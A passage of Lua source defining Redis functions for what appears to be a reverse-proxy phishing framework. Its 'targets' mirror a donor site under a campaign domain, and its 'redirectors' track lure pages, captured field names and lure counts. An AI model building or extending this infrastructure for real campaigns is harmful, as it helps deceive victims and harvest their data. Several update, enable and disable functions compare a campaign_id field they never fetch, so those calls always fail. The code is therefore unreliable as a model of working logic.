    { name = 'donor_secure', kind = 'int', min = 0, max = 1 },
    { name = 'donor_sub', kind = 'str' },
    { name = 'donor_domain', kind = 'str' },
    { name = 'donor_port', kind = 'str' },
    { name = 'mirror_secure', kind = 'int', min = 0, max = 1 },
    { name = 'mirror_sub', kind = 'str' },
    { name = 'mirror_port', kind = 'str' },
    { name = 'tenant', kind = 'any' },
    { name = 'connect_timeout', kind = 'int', min = 1 },
    { name = 'simple_timeout', kind = 'int', min = 1 },
    { name = 'stream_timeout', kind = 'int', min = 1 },
    { name = 'headers_size_limit', kind = 'int', min = 1 },
    { name = 'body_size_limit', kind = 'int', min = 1 },
    { name = 'main_page', kind = 'str' },
    { name = 'not_found_page', kind = 'str' },
    { name = 'favicon_ico', kind = 'str' },
    { name = 'robots_txt', kind = 'str' },
    { name = 'sitemap_xml', kind = 'str' },
    { name = 'allow_websockets', kind = 'int', min = 0, max = 1 },
    { name = 'lock_secret', kind = 'str' },
  })

  if args_err then
    return redis.error_reply('ERR normalize args: ' .. args_err)
  end

  local now = current_time()

  if redis.call('EXISTS', campaign_key) == 0 then
    return redis.status_reply('NOT_FOUND campaign not exists')
  end

  if redis.call('EXISTS', campaign_lock_key) == 0 then
    return redis.status_reply('FORBIDDEN campaign not locked')
  end

  local lock_secret = redis.call('GET', campaign_lock_key)

  if not lock_secret or lock_secret ~= args.lock_secret then
    return redis.status_reply('FORBIDDEN campaign lock_secret mismatch')
  end

  if redis.call('EXISTS', target_key) == 1 then
    return redis.status_reply('CONFLICT target already exists')
  end

  -- stylua: ignore
  local raw_campaign = redis.call(
    'HMGET', campaign_key,
    'campaign_id',
    'mirror_domain'
  )

  local campaign, campaign_err = normalize(raw_campaign, {
    { name = 'campaign_id', kind = 'str' },
    { name = 'mirror_domain', kind = 'str' },
  })

  if campaign_err then
    return redis.error_reply('ERR normalize campaign: ' .. campaign_err)
  end

  if campaign.campaign_id ~= args.campaign_id then
    return redis.status_reply('FORBIDDEN target campaign_id mismatch')
  end

  -- stylua: ignore
  local donor_stamp = args.campaign_id
    .. '\t' .. args.donor_sub
    .. '\t' .. args.donor_domain
    .. '\t' .. args.donor_port

  if redis.call('SISMEMBER', target_donors_key, donor_stamp) == 1 then
    return redis.status_reply('CONFLICT target donor already taken')
  end

  -- stylua: ignore
  local mirror_stamp = args.campaign_id
    .. '\t' .. args.mirror_sub
    .. '\t' .. args.mirror_port

  if redis.call('SISMEMBER', target_mirrors_key, mirror_stamp) == 1 then
    return redis.status_reply('CONFLICT target mirror already taken')
  end

  local mirror_hostname = args.mirror_sub ~= TARGET_SUB_APEX
      and (args.mirror_sub .. '.' .. campaign.mirror_domain)
    or campaign.mirror_domain

  local mirror_host = mirror_hostname .. ':' .. args.mirror_port
  local target_link = args.campaign_id .. '\t' .. args.target_id

  if redis.call('HEXISTS', target_hosts_key, mirror_host) == 1 then
    return redis.status_reply('CONFLICT target mirror host already taken')
  end

  -- Point of no return

  -- stylua: ignore
  redis.call(
    'HSET', target_key,
    'campaign_id', args.campaign_id,
    'target_id', args.target_id,
    'access_level', args.access_level,
    'donor_secure', args.donor_secure,
    'donor_sub', args.donor_sub,
    'donor_domain', args.donor_domain,
    'donor_port', args.donor_port,
    'mirror_secure', args.mirror_secure,
    'mirror_sub', args.mirror_sub,
    'mirror_port', args.mirror_port,
    'tenant', args.tenant,
    'connect_timeout', args.connect_timeout,
    'simple_timeout', args.simple_timeout,
    'stream_timeout', args.stream_timeout,
    'headers_size_limit', args.headers_size_limit,
    'body_size_limit', args.body_size_limit,
    'main_page', args.main_page,
    'not_found_page', args.not_found_page,
    'favicon_ico', args.favicon_ico,
    'robots_txt', args.robots_txt,
    'sitemap_xml', args.sitemap_xml,
    'allow_websockets', args.allow_websockets,
    'is_enabled', 0,
    'message_count', 0,
    'created_at', now
  )

  redis.call('SADD', target_donors_key, donor_stamp)
  redis.call('SADD', target_mirrors_key, mirror_stamp)
  redis.call('HSET', target_hosts_key, mirror_host, target_link)
  redis.call('ZADD', target_index_key, now, args.target_id)

  return redis.status_reply('OK target created')
end

redis.register_function({
  function_name = 'create_target',
  callback = create_target,
  description = 'Create target',
})

local function read_target(keys, args)
  if #keys ~= 2 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local target_key = keys[2]

  if #args ~= 0 then
    return redis.error_reply('ERR wrong number of args')
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return nil
  end

  if redis.call('EXISTS', target_key) == 0 then
    return nil
  end

  -- stylua: ignore
  local raw_target = redis.call(
    'HMGET', target_key,
    'campaign_id',
    'target_id',
    'access_level',
    'donor_secure',
    'donor_sub',
    'donor_domain',
    'donor_port',
    'mirror_secure',
    'mirror_sub',
    'mirror_port',
    'tenant',
    'is_enabled',
    'message_count',
    'created_at'
  )

  local target, target_err = normalize(raw_target, {
    { name = 'campaign_id', kind = 'str' },
    { name = 'target_id', kind = 'str' },
    { name = 'access_level', kind = 'str' },
    { name = 'donor_secure', kind = 'int', min = 0, max = 1 },
    { name = 'donor_sub', kind = 'str' },
    { name = 'donor_domain', kind = 'str' },
    { name = 'donor_port', kind = 'str' },
    { name = 'mirror_secure', kind = 'int', min = 0, max = 1 },
    { name = 'mirror_sub', kind = 'str' },
    { name = 'mirror_port', kind = 'str' },
    { name = 'tenant', kind = 'any' },
    { name = 'is_enabled', kind = 'int', min = 0, max = 1 },
    { name = 'message_count', kind = 'int', min = 0 },
    { name = 'created_at', kind = 'int', min = 0 },
  })

  if target_err then
    return redis.error_reply('ERR normalize target: ' .. target_err)
  end

  -- stylua: ignore
  local raw_campaign = redis.call(
    'HMGET', campaign_key,
    'campaign_id',
    'mirror_domain'
  )

  local campaign, campaign_err = normalize(raw_campaign, {
    { name = 'campaign_id', kind = 'str' },
    { name = 'mirror_domain', kind = 'str' },
  })

  if campaign_err then
    return redis.error_reply('ERR normalize campaign: ' .. campaign_err)
  end

  if campaign.campaign_id ~= target.campaign_id then
    return redis.error_reply('ERR target campaign_id mismatch')
  end

  target.donor_secure = target.donor_secure == 1
  target.mirror_secure = target.mirror_secure == 1
  target.is_enabled = target.is_enabled == 1

  target.mirror_domain = campaign.mirror_domain

  return { map = target }
end

redis.register_function({
  function_name = 'read_target',
  callback = read_target,
  flags = { 'no-writes' },
  description = 'Read target',
})

local function read_full_target(keys, args)
  if #keys ~= 2 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local target_key = keys[2]

  if #args ~= 0 then
    return redis.error_reply('ERR wrong number of args')
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return nil
  end

  if redis.call('EXISTS', target_key) == 0 then
    return nil
  end

  -- stylua: ignore
  local raw_target = redis.call(
    'HMGET', target_key,
    'campaign_id',
    'target_id',
    'access_level',
    'donor_secure',
    'donor_sub',
    'donor_domain',
    'donor_port',
    'mirror_secure',
    'mirror_sub',
    'mirror_port',
    'tenant',
    'connect_timeout',
    'simple_timeout',
    'stream_timeout',
    'headers_size_limit',
    'body_size_limit',
    'main_page',
    'not_found_page',
    'favicon_ico',
    'robots_txt',
    'sitemap_xml',
    'allow_websockets',
    'is_enabled',
    'message_count',
    'created_at'
  )

  local target, target_err = normalize(raw_target, {
    { name = 'campaign_id', kind = 'str' },
    { name = 'target_id', kind = 'str' },
    { name = 'access_level', kind = 'str' },
    { name = 'donor_secure', kind = 'int', min = 0, max = 1 },
    { name = 'donor_sub', kind = 'str' },
    { name = 'donor_domain', kind = 'str' },
    { name = 'donor_port', kind = 'str' },
    { name = 'mirror_secure', kind = 'int', min = 0, max = 1 },
    { name = 'mirror_sub', kind = 'str' },
    { name = 'mirror_port', kind = 'str' },
    { name = 'tenant', kind = 'any' },
    { name = 'connect_timeout', kind = 'int', min = 1 },
    { name = 'simple_timeout', kind = 'int', min = 1 },
    { name = 'stream_timeout', kind = 'int', min = 1 },
    { name = 'headers_size_limit', kind = 'int', min = 1 },
    { name = 'body_size_limit', kind = 'int', min = 1 },
    { name = 'main_page', kind = 'str' },
    { name = 'not_found_page', kind = 'str' },
    { name = 'favicon_ico', kind = 'str' },
    { name = 'robots_txt', kind = 'str' },
    { name = 'sitemap_xml', kind = 'str' },
    { name = 'allow_websockets', kind = 'int', min = 0, max = 1 },
    { name = 'is_enabled', kind = 'int', min = 0, max = 1 },
    { name = 'message_count', kind = 'int', min = 0 },
    { name = 'created_at', kind = 'int', min = 0 },
  })

  if target_err then
    return redis.error_reply('ERR normalize target: ' .. target_err)
  end

  -- stylua: ignore
  local raw_campaign = redis.call(
    'HMGET', campaign_key,
    'campaign_id',
    'mirror_domain'
  )

  local campaign, campaign_err = normalize(raw_campaign, {
    { name = 'campaign_id', kind = 'str' },
    { name = 'mirror_domain', kind = 'str' },
  })

  if campaign_err then
    return redis.error_reply('ERR normalize campaign: ' .. campaign_err)
  end

  if campaign.campaign_id ~= target.campaign_id then
    return redis.error_reply('ERR target campaign_id mismatch')
  end

  target.donor_secure = target.donor_secure == 1
  target.mirror_secure = target.mirror_secure == 1
  target.allow_websockets = target.allow_websockets == 1
  target.is_enabled = target.is_enabled == 1

  target.mirror_domain = campaign.mirror_domain

  return { map = target }
end

redis.register_function({
  function_name = 'read_full_target',
  callback = read_full_target,
  flags = { 'no-writes' },
  description = 'Read full target',
})

local function read_target_hosts(keys, args)
  if #keys ~= 1 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local target_hosts_key = keys[1]

  if #args ~= 0 then
    return redis.error_reply('ERR wrong number of args')
  end

  local hosts = {}

  local values = redis.call('HGETALL', target_hosts_key)

  if #values % 2 ~= 0 then
    return redis.error_reply('ERR malform target_hosts')
  end

  for i = 1, #values, 2 do
    local campaign_id, target_id = string.match(values[i + 1], '^([^\t]+)\t([^\t]+)$')

    if not campaign_id or campaign_id == '' or not target_id or target_id == '' then
      return redis.error_reply('ERR malform target_link')
    end

    hosts[values[i]] = { campaign_id, target_id }
  end

  return { map = hosts }
end

redis.register_function({
  function_name = 'read_target_hosts',
  callback = read_target_hosts,
  flags = { 'no-writes' },
  description = 'Read target hosts',
})

local function find_target_link(keys, raw_args)
  if #keys ~= 1 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local target_hosts_key = keys[1]

  local args, args_err = normalize(raw_args, {
    { name = 'mirror_host', kind = 'str' },
  })

  if args_err then
    return redis.error_reply('ERR normalize args: ' .. args_err)
  end

  if redis.call('HEXISTS', target_hosts_key, args.mirror_host) == 0 then
    return nil
  end

  local target_link = redis.call('HGET', target_hosts_key, args.mirror_host)
  local campaign_id, target_id = string.match(target_link, '^([^\t]+)\t([^\t]+)$')

  if not campaign_id or campaign_id == '' or not target_id or target_id == '' then
    return redis.error_reply('ERR malform target_link')
  end

  return { campaign_id, target_id }
end

redis.register_function({
  function_name = 'find_target_link',
  callback = find_target_link,
  flags = { 'no-writes' },
  description = 'Find target link',
})

local function read_target_index(keys, args)
  if #keys ~= 2 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local target_index_key = keys[2]

  if #args ~= 0 then
    return redis.error_reply('ERR wrong number of args')
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return nil
  end

  return redis.call('ZRANGE', target_index_key, 0, -1)
end

redis.register_function({
  function_name = 'read_target_index',
  callback = read_target_index,
  flags = { 'no-writes' },
  description = 'Read target index',
})

local function update_target(keys, raw_args)
  if #keys ~= 3 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local campaign_lock_key = keys[2]
  local target_key = keys[3]

  local args, args_err = normalize(raw_args, {
    { name = 'connect_timeout', kind = 'int', min = 1 },
    { name = 'simple_timeout', kind = 'int', min = 1 },
    { name = 'stream_timeout', kind = 'int', min = 1 },
    { name = 'headers_size_limit', kind = 'int', min = 1 },
    { name = 'body_size_limit', kind = 'int', min = 1 },
    { name = 'main_page', kind = 'str' },
    { name = 'not_found_page', kind = 'str' },
    { name = 'favicon_ico', kind = 'str' },
    { name = 'robots_txt', kind = 'str' },
    { name = 'sitemap_xml', kind = 'str' },
    { name = 'allow_websockets', kind = 'int', min = 0, max = 1 },
    { name = 'lock_secret', kind = 'str' },
  })

  if args_err then
    return redis.error_reply('ERR normalize args: ' .. args_err)
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return redis.status_reply('NOT_FOUND campaign not exists')
  end

  if redis.call('EXISTS', campaign_lock_key) == 0 then
    return redis.status_reply('FORBIDDEN campaign not locked')
  end

  local lock_secret = redis.call('GET', campaign_lock_key)

  if not lock_secret or lock_secret ~= args.lock_secret then
    return redis.status_reply('FORBIDDEN campaign lock_secret mismatch')
  end

  if redis.call('EXISTS', target_key) == 0 then
    return redis.status_reply('NOT_FOUND target not exists')
  end

  -- stylua: ignore
  local raw_target = redis.call(
    'HMGET', target_key,
    'target_id'
  )

  local target, target_err = normalize(raw_target, {
    { name = 'target_id', kind = 'str' },
  })

  if target_err then
    return redis.error_reply('ERR normalize target: ' .. target_err)
  end

  -- stylua: ignore
  local raw_campaign = redis.call(
    'HMGET', campaign_key,
    'campaign_id'
  )

  local campaign, campaign_err = normalize(raw_campaign, {
    { name = 'campaign_id', kind = 'str' },
  })

  if campaign_err then
    return redis.error_reply('ERR normalize campaign: ' .. campaign_err)
  end

  if campaign.campaign_id ~= target.campaign_id then
    return redis.status_reply('FORBIDDEN target campaign_id mismatch')
  end

  -- Point of no return

  -- stylua: ignore
  redis.call(
    'HSET', target_key,
    'connect_timeout', args.connect_timeout,
    'simple_timeout', args.simple_timeout,
    'stream_timeout', args.stream_timeout,
    'headers_size_limit', args.headers_size_limit,
    'body_size_limit', args.body_size_limit,
    'main_page', args.main_page,
    'not_found_page', args.not_found_page,
    'favicon_ico', args.favicon_ico,
    'robots_txt', args.robots_txt,
    'sitemap_xml', args.sitemap_xml,
    'allow_websockets', args.allow_websockets
  )

  return redis.status_reply('OK target updated')
end

redis.register_function({
  function_name = 'update_target',
  callback = update_target,
  description = 'Update target',
})

local function enable_target(keys, raw_args)
  if #keys ~= 3 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local campaign_lock_key = keys[2]
  local target_key = keys[3]

  local args, args_err = normalize(raw_args, {
    { name = 'lock_secret', kind = 'str' },
  })

  if args_err then
    return redis.error_reply('ERR normalize args: ' .. args_err)
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return redis.status_reply('NOT_FOUND campaign not exists')
  end

  if redis.call('EXISTS', campaign_lock_key) == 0 then
    return redis.status_reply('FORBIDDEN campaign not locked')
  end

  local lock_secret = redis.call('GET', campaign_lock_key)

  if not lock_secret or lock_secret ~= args.lock_secret then
    return redis.status_reply('FORBIDDEN campaign lock_secret mismatch')
  end

  if redis.call('EXISTS', target_key) == 0 then
    return redis.status_reply('NOT_FOUND target not exists')
  end

  -- stylua: ignore
  local raw_target = redis.call(
    'HMGET', target_key,
    'target_id',
    'is_enabled'
  )

  local target, target_err = normalize(raw_target, {
    { name = 'target_id', kind = 'str' },
    { name = 'is_enabled', kind = 'int', min = 0, max = 1 },
  })

  if target_err then
    return redis.error_reply('ERR normalize target: ' .. target_err)
  end

  -- stylua: ignore
  local raw_campaign = redis.call(
    'HMGET', campaign_key,
    'campaign_id'
  )

  local campaign, campaign_err = normalize(raw_campaign, {
    { name = 'campaign_id', kind = 'str' },
  })

  if campaign_err then
    return redis.error_reply('ERR normalize campaign: ' .. campaign_err)
  end

  if campaign.campaign_id ~= target.campaign_id then
    return redis.status_reply('FORBIDDEN target campaign_id mismatch')
  end

  if target.is_enabled == 1 then
    return redis.status_reply('OK target already enabled')
  end

  -- Point of no return

  redis.call('HSET', target_key, 'is_enabled', 1)

  return redis.status_reply('OK target enabled')
end

redis.register_function({
  function_name = 'enable_target',
  callback = enable_target,
  description = 'Enable target',
})

local function disable_target(keys, raw_args)
  if #keys ~= 3 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local campaign_lock_key = keys[2]
  local target_key = keys[3]

  local args, args_err = normalize(raw_args, {
    { name = 'lock_secret', kind = 'str' },
  })

  if args_err then
    return redis.error_reply('ERR normalize args: ' .. args_err)
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return redis.status_reply('NOT_FOUND campaign not exists')
  end

  if redis.call('EXISTS', campaign_lock_key) == 0 then
    return redis.status_reply('FORBIDDEN campaign not locked')
  end

  local lock_secret = redis.call('GET', campaign_lock_key)

  if not lock_secret or lock_secret ~= args.lock_secret then
    return redis.status_reply('FORBIDDEN campaign lock_secret mismatch')
  end

  if redis.call('EXISTS', target_key) == 0 then
    return redis.status_reply('NOT_FOUND target not exists')
  end

  -- stylua: ignore
  local raw_target = redis.call(
    'HMGET', target_key,
    'target_id',
    'is_enabled'
  )

  local target, target_err = normalize(raw_target, {
    { name = 'target_id', kind = 'str' },
    { name = 'is_enabled', kind = 'int', min = 0, max = 1 },
  })

  if target_err then
    return redis.error_reply('ERR normalize target: ' .. target_err)
  end

  -- stylua: ignore
  local raw_campaign = redis.call(
    'HMGET', campaign_key,
    'campaign_id'
  )

  local campaign, campaign_err = normalize(raw_campaign, {
    { name = 'campaign_id', kind = 'str' },
  })

  if campaign_err then
    return redis.error_reply('ERR normalize campaign: ' .. campaign_err)
  end

  if campaign.campaign_id ~= target.campaign_id then
    return redis.status_reply('FORBIDDEN target campaign_id mismatch')
  end

  if target.is_enabled == 0 then
    return redis.status_reply('OK target already disabled')
  end

  -- Point of no return

  redis.call('HSET', target_key, 'is_enabled', 0)

  return redis.status_reply('OK target disabled')
end

redis.register_function({
  function_name = 'disable_target',
  callback = disable_target,
  description = 'Disable target',
})

local function delete_target(keys, raw_args)
  if #keys ~= 7 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local campaign_lock_key = keys[2]
  local target_key = keys[3]
  local target_donors_key = keys[4]
  local target_mirrors_key = keys[5]
  local target_hosts_key = keys[6]
  local target_index_key = keys[7]

  local args, args_err = normalize(raw_args, {
    { name = 'lock_secret', kind = 'str' },
  })

  if args_err then
    return redis.error_reply('ERR normalize args: ' .. args_err)
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return redis.status_reply('NOT_FOUND campaign not exists')
  end

  if redis.call('EXISTS', campaign_lock_key) == 0 then
    return redis.status_reply('FORBIDDEN campaign not locked')
  end

  local lock_secret = redis.call('GET', campaign_lock_key)

  if not lock_secret or lock_secret ~= args.lock_secret then
    return redis.status_reply('FORBIDDEN campaign lock_secret mismatch')
  end

  if redis.call('EXISTS', target_key) == 0 then
    return redis.status_reply('NOT_FOUND target not exists')
  end

  -- stylua: ignore
  local raw_target = redis.call(
    'HMGET', target_key,
    'campaign_id',
    'target_id',
    'donor_sub',
    'donor_domain',
    'donor_port',
    'mirror_sub',
    'mirror_port',
    'is_enabled'
  )

  local target, target_err = normalize(raw_target, {
    { name = 'campaign_id', kind = 'str' },
    { name = 'target_id', kind = 'str' },
    { name = 'donor_sub', kind = 'str' },
    { name = 'donor_domain', kind = 'str' },
    { name = 'donor_port', kind = 'str' },
    { name = 'mirror_sub', kind = 'str' },
    { name = 'mirror_port', kind = 'str' },
    { name = 'is_enabled', kind = 'int', min = 0, max = 1 },
  })

  if target_err then
    return redis.error_reply('ERR normalize target: ' .. target_err)
  end

  -- stylua: ignore
  local raw_campaign = redis.call(
    'HMGET', campaign_key,
    'campaign_id',
    'mirror_domain'
  )

  local campaign, campaign_err = normalize(raw_campaign, {
    { name = 'campaign_id', kind = 'str' },
    { name = 'mirror_domain', kind = 'str' },
  })

  if campaign_err then
    return redis.error_reply('ERR normalize campaign: ' .. campaign_err)
  end

  if campaign.campaign_id ~= target.campaign_id then
    return redis.status_reply('FORBIDDEN target campaign_id mismatch')
  end

  if target.is_enabled == 1 then
    return redis.status_reply('FORBIDDEN target not disabled')
  end

  -- stylua: ignore
  local donor_stamp = target.campaign_id
    .. '\t' .. target.donor_sub
    .. '\t' .. target.donor_domain
    .. '\t' .. target.donor_port

  -- stylua: ignore
  local mirror_stamp = target.campaign_id
    .. '\t' .. target.mirror_sub
    .. '\t' .. target.mirror_port

  local mirror_hostname = target.mirror_sub ~= TARGET_SUB_APEX
      and (target.mirror_sub .. '.' .. campaign.mirror_domain)
    or campaign.mirror_domain

  local mirror_host = mirror_hostname .. ':' .. target.mirror_port

  -- Point of no return

  redis.call('DEL', target_key)
  redis.call('SREM', target_donors_key, donor_stamp)
  redis.call('SREM', target_mirrors_key, mirror_stamp)
  redis.call('HDEL', target_hosts_key, mirror_host)
  redis.call('ZREM', target_index_key, target.target_id)

  return redis.status_reply('OK target deleted')
end

redis.register_function({
  function_name = 'delete_target',
  callback = delete_target,
  description = 'Delete target',
})

--
-- Redirector methods
--

local function create_redirector(keys, raw_args)
  if #keys ~= 4 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local campaign_lock_key = keys[2]
  local redirector_key = keys[3]
  local redirector_index_key = keys[4]

  local args, args_err = normalize(raw_args, {
    { name = 'campaign_id', kind = 'str' },
    { name = 'redirector_id', kind = 'str' },
    { name = 'page', kind = 'any' },
    { name = 'lock_secret', kind = 'str' },
  })

  if args_err then
    return redis.error_reply('ERR normalize args: ' .. args_err)
  end

  local now = current_time()

  if redis.call('EXISTS', campaign_key) == 0 then
    return redis.status_reply('NOT_FOUND campaign not exists')
  end

  if redis.call('EXISTS', campaign_lock_key) == 0 then
    return redis.status_reply('FORBIDDEN campaign not locked')
  end

  local lock_secret = redis.call('GET', campaign_lock_key)

  if not lock_secret or lock_secret ~= args.lock_secret then
    return redis.status_reply('FORBIDDEN campaign lock_secret mismatch')
  end

  if redis.call('EXISTS', redirector_key) == 1 then
    return redis.status_reply('CONFLICT redirector already exists')
  end

  -- stylua: ignore
  local raw_campaign = redis.call(
    'HMGET', campaign_key,
    'campaign_id'
  )

  local campaign, campaign_err = normalize(raw_campaign, {
    { name = 'campaign_id', kind = 'str' },
  })

  if campaign_err then
    return redis.error_reply('ERR normalize campaign: ' .. campaign_err)
  end

  if campaign.campaign_id ~= args.campaign_id then
    return redis.status_reply('FORBIDDEN redirector campaign_id mismatch')
  end

  -- Point of no return

  -- stylua: ignore
  redis.call(
    'HSET', redirector_key,
    'campaign_id', args.campaign_id,
    'redirector_id', args.redirector_id,
    'page', args.page,
    'lure_count', 0,
    'created_at', now
  )

  redis.call('ZADD', redirector_index_key, now, args.redirector_id)

  return redis.status_reply('OK redirector created')
end

redis.register_function({
  function_name = 'create_redirector',
  callback = create_redirector,
  description = 'Create redirector',
})

local function read_redirector(keys, args)
  if #keys ~= 3 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local redirector_key = keys[2]
  local redirector_fields_key = keys[3]

  if #args ~= 0 then
    return redis.error_reply('ERR wrong number of args')
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return nil
  end

  if redis.call('EXISTS', redirector_key) == 0 then
    return nil
  end

  -- stylua: ignore
  local raw_redirector = redis.call(
    'HMGET', redirector_key,
    'campaign_id',
    'redirector_id',
    'page',
    'lure_count',
    'created_at'
  )

  local redirector, redirector_err = normalize(raw_redirector, {
    { name = 'campaign_id', kind = 'str' },
    { name = 'redirector_id', kind = 'str' },
    { name = 'page', kind = 'any' },
    { name = 'lure_count', kind = 'int', min = 0 },
    { name = 'created_at', kind = 'int', min = 0 },
  })

  if redirector_err then
    return redis.error_reply('ERR normalize redirector: ' .. redirector_err)
  end

  redirector.fields = redis.call('SMEMBERS', redirector_fields_key)

  -- stylua: ignore
  local raw_campaign = redis.call(
    'HMGET', campaign_key,
    'campaign_id'
  )

  local campaign, campaign_err = normalize(raw_campaign, {
    { name = 'campaign_id', kind = 'str' },
  })

  if campaign_err then
    return redis.error_reply('ERR normalize campaign: ' .. campaign_err)
  end

  if campaign.campaign_id ~= redirector.campaign_id then
    return redis.error_reply('ERR redirector campaign_id mismatch')
  end

  return { map = redirector }
end

redis.register_function({
  function_name = 'read_redirector',
  callback = read_redirector,
  flags = { 'no-writes' },
  description = 'Read redirector',
})

local function read_redirector_index(keys, args)
  if #keys ~= 2 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local redirector_index_key = keys[2]

  if #args ~= 0 then
    return redis.error_reply('ERR wrong number of args')
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return nil
  end

  return redis.call('ZRANGE', redirector_index_key, 0, -1)
end

redis.register_function({
  function_name = 'read_redirector_index',
  callback = read_redirector_index,
  flags = { 'no-writes' },
  description = 'Read redirector index',
})

local function update_redirector(keys, raw_args)
  if #keys ~= 3 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local campaign_lock_key = keys[2]
  local redirector_key = keys[3]

  local args, args_err = normalize(raw_args, {
    { name = 'page', kind = 'any' },
    { name = 'lock_secret', kind = 'str' },
  })

  if args_err then
    return redis.error_reply('ERR normalize args: ' .. args_err)
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return redis.status_reply('NOT_FOUND campaign not exists')
  end

  if redis.call('EXISTS', campaign_lock_key) == 0 then
    return redis.status_reply('FORBIDDEN campaign not locked')
  end

  local lock_secret = redis.call('GET', campaign_lock_key)

  if not lock_secret or lock_secret ~= args.lock_secret then
    return redis.status_reply('FORBIDDEN campaign lock_secret mismatch')
  end

  if redis.call('EXISTS', redirector_key) == 0 then
    return redis.status_reply('NOT_FOUND redirector not exists')
  end

  -- stylua: ignore
  local raw_redirector = redis.call(
    'HMGET', redirector_key,
    'redirector_id'
  )

  local redirector, redirector_err = normalize(raw_redirector, {
    { name = 'redirector_id', kind = 'str' },
  })

  if redirector_err then
    return redis.error_reply('ERR normalize redirector: ' .. redirector_err)
  end

  -- stylua: ignore
  local raw_campaign = redis.call(
    'HMGET', campaign_key,
    'campaign_id'
  )

  local campaign, campaign_err = normalize(raw_campaign, {
    { name = 'campaign_id', kind = 'str' },
  })

  if campaign_err then
    return redis.error_reply('ERR normalize campaign: ' .. campaign_err)
  end

  if campaign.campaign_id ~= redirector.campaign_id then
    return redis.status_reply('FORBIDDEN redirector campaign_id mismatch')
  end

  -- Point of no return

  -- stylua: ignore
  redis.call(
    'HSET', redirector_key,
    'page', args.page
  )

  return redis.status_reply('OK redirector updated')
end

redis.register_function({
  function_name = 'update_redirector',
  callback = update_redirector,
  description = 'Update redirector',
})

local function append_redirector_field(keys, raw_args)
  if #keys ~= 4 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local campaign_lock_key = keys[2]
  local redirector_key = keys[3]
  local redirector_fields_key = keys[4]

  local args, args_err = normalize(raw_args, {
    { name = 'field', kind = 'str' },
    { name = 'lock_secret', kind = 'str' },
  })

  if args_err then
    return redis.error_reply('ERR normalize args: ' .. args_err)
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return redis.status_reply('NOT_FOUND campaign not exists')
  end

  if redis.call('EXISTS', campaign_lock_key) == 0 then
    return redis.status_reply('FORBIDDEN campaign not locked')
  end

  local lock_secret = redis.call('GET', campaign_lock_key)

  if not lock_secret or lock_secret ~= args.lock_secret then
    return redis.status_reply('FORBIDDEN campaign lock_secret mismatch')
  end

  if redis.call('EXISTS', redirector_key) == 0 then
    return redis.status_reply('NOT_FOUND redirector not exists')
  end

  -- stylua: ignore
  local raw_redirector = redis.call(
    'HMGET', redirector_key,
    'redirector_id'
  )

  local redirector, redirector_err = normalize(raw_redirector, {
    { name = 'redirector_id', kind = 'str' },
  })

  if redirector_err then
    return redis.error_reply('ERR normalize redirector: ' .. redirector_err)
  end

  -- stylua: ignore
  local raw_campaign = redis.call(
    'HMGET', campaign_key,
    'campaign_id'
  )

  local campaign, campaign_err = normalize(raw_campaign, {
    { name = 'campaign_id', kind = 'str' },
  })

  if campaign_err then
    return redis.error_reply('ERR normalize campaign: ' .. campaign_err)
  end

  if campaign.campaign_id ~= redirector.campaign_id then
    return redis.status_reply('FORBIDDEN redirector campaign_id mismatch')
  end

  if redis.call('SISMEMBER', redirector_fields_key, args.field) == 1 then
    return redis.status_reply('OK redirector field already exists')
  end

  -- Point of no return

  redis.call('SADD', redirector_fields_key, args.field)

  return redis.status_reply('OK redirector field appended')
end

redis.register_function({
  function_name = 'append_redirector_field',
  callback = append_redirector_field,
  description = 'Append redirector field',
})

local function clear_redirector_fields(keys, raw_args)
  if #keys ~= 4 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local campaign_lock_key = keys[2]
  local redirector_key = keys[3]
  local redirector_fields_key = keys[4]

  local args, args_err = normalize(raw_args, {
    { name = 'lock_secret', kind = 'str' },
  })

  if args_err then
    return redis.error_reply('ERR normalize args: ' .. args_err)
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return redis.status_reply('NOT_FOUND campaign not exists')
  end

  if redis.call('EXISTS', campaign_lock_key) == 0 then
    return redis.status_reply('FORBIDDEN campaign not locked')
  end

  local lock_secret = redis.call('GET', campaign_lock_key)

  if not lock_secret or lock_secret ~= args.lock_secret then
    return redis.status_reply('FORBIDDEN campaign lock_secret mismatch')
  end

  if redis.call('EXISTS', redirector_key) == 0 then
    return redis.status_reply('NOT_FOUND redirector not exists')
  end

  -- stylua: ignore
  local raw_redirector = redis.call(
    'HMGET', redirector_key,
    'redirector_id'
  )

  local redirector, redirector_err = normalize(raw_redirector, {
    { name = 'redirector_id', kind = 'str' },
  })

  if redirector_err then
    return redis.error_reply('ERR normalize redirector: ' .. redirector_err)
  end

  -- stylua: ignore
  local raw_campaign = redis.call(
    'HMGET', campaign_key,
    'campaign_id'
  )

  local campaign, campaign_err = normalize(raw_campaign, {
    { name = 'campaign_id', kind = 'str' },
  })

  if campaign_err then
